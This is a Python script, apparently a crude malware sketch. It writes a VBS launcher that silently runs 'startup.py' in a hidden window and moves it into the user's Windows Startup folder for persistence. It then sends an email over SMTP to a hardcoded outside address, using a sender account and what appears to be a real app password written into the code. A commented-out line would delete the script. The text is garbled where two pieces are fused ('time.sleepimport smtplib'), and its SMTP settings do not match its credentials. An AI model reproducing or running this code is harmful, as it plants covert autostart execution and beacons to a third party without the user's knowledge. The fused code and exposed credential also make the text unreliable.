import shutil
import getpass
import os, time

current_folder = os.getcwd()

username = getpass.getuser()
file_name = "startup.vbs"

with open(file_name, 'w') as f:
    f.write('Set objShell = CreateObject("WScript.Shell")\n')
    f.write('objShell.Run "cmd /c python {}\startup.py", 0, False\n'.format(current_folder))
    f.write('Set objShell = Nothing')

# move the file from source to destination
src_file = f"{current_folder}\{file_name}"
dst_folder = r"C:\Users"+r"/"+username+r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
shutil.move(src_file, dst_folder)

time.sleepimport smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Define message
message = MIMEMultipart()
message['From'] = 'quinnirene701@gmail.com'
message['To'] = 'abubokortanjim@gmail.com'
message['Subject'] = 'Subject of the Email'

# Add message body
message_body = dst_folder
message.attach(MIMEText(message_body, 'plain'))

# Define SMTP server
smtp_server = "smtp.example.com"
smtp_port = 587
smtp_username = "quinnirene701@gmail.com"
smtp_password = "passwordrrcjnzutcgbpuxqv"

# Create SMTP object
smtp_obj = smtplib.SMTP(smtp_server, smtp_port)
smtp_obj.starttls()
smtp_obj.login(smtp_username, smtp_password)

# Send email
smtp_obj.sendmail(message['From'], message['To'], message.as_string())
smtp_obj.quit()

#os.remove(__file__)
